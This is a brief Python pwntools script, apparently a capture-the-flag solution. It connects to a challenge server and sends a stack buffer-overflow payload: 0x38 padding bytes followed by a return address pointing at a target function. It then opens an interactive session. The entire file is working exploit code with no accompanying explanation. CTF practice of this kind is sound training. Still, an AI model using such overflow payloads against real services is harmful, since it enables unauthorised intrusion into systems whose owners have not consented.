from pwn import *

context.arch = 'amd64'

p = remote('ctf.adl.tw', 10000)

sakidaisuki = 0x4011fb

payload = b'A' * 0x38
payload += p64(sakidaisuki)

p.sendline(payload)

p.interactive()